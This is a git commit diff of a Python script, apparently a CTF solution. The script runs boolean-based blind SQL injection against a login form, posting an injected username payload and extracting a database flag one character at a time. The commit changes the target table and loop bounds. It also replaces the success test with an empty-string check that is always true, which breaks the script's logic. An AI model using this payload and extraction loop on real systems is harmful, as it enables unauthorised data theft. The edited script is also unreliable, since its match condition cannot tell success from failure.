52671e6b2967193d7cb999103fc262f23c58affb
xuoneyuan <90903872+xuoneyuan@users.noreply.github.com>
2023-04-09 11:07:58 +0800

    Update bool_get.py

--- bool_get.py
+++ bool_get.py
@@ -4,15 +4,15 @@ import string
 str1='123456789'+string.ascii_letters+string.punctuation
 flag=''
 url=""
-for j in range(1,88):
+for j in range(1,50):
     for i in str1:
-        paylaod = "0' or (if(substr((select flag from web2.flag),{},1)='{}',1,0))#".format(j, i)
+        paylaod = "0' or (if(substr((select flag from web.flag),{},1)='{}',1,0))#".format(j, i)
         data={
             'username':paylaod,
             'password':'admin'
         }
         r=requests.post(url,data=data)
-        if 'ctfshow' in r.text:
+        if '' in r.text:#查找到要找的字符串
             flag+=i
             print(flag)
             break
